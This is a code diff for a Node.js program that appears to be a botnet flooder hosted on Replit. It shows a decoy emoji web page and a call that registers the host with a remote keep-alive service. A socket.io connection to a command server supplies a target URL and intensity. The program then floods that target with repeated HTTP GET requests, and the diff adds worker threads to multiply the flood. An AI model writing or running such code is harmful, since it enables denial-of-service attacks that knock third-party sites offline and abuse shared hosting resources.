@@ -1,7 +1,9 @@
 const io = require("socket.io-client");
 const express = require('express')
 const axios = require('axios')
+const { Worker, isMainThread, workerData } = require('worker_threads')
 const emojis = require('./emojis.json')
+if (isMainThread) {
 var app = express()
 var randFromArr = (arr) => {
   return arr[Math.floor(Math.random() * arr.length)]
@@ -11,7 +13,14 @@ app.get("/", async (req, res) => {
   for (i = 0; i < 10; i++) e += randFromArr(emojis);
   res.end(`<h1 style="font-size:10vw">${e}</h1>`)
 })
-
+async function cringe() {
+  await axios.get("https://ping.iEp0KJuM6sitY5e.repl.co/add?url=https://" + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co")
+  console.log("ADDED")
+}
+cringe()
+app.listen(4000)
+for (i=0;i<Math.floor(require('os').cpus().length/1.5);i++) new Worker(__filename, {workerData:i}), console.log(i, 'worker')
+} else {
 var url = ''
 var pow = 0
 
@@ -24,9 +33,15 @@ const socket = io("wss://server.iep0kjum6sity5e.repl.co", {
 
 setInterval(() => {
   for (i = 0; i < pow; i++) {
-    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.") })
-    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.") })
-    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.") })
+    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.", url, workerData) }).then(()=>{
+      console.log('sent')
+    })
+    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.", url, workerData) }).then(()=>{
+      console.log('sent')
+    })
+    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.", url, workerData) }).then(()=>{
+      console.log('sent')
+    })
   }
 }, .02)
 
@@ -53,9 +68,4 @@ function reconnect() {
   });
 }
 socket.on('disconnect', () => { setTimeout(() => { console.log("r") }, 6000) })
-async function cringe() {
-  await axios.get("https://ping.iEp0KJuM6sitY5e.repl.co/add?url=https://" + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co")
-  console.log("ADDED")
 }
-cringe()
-app.listen(4000)
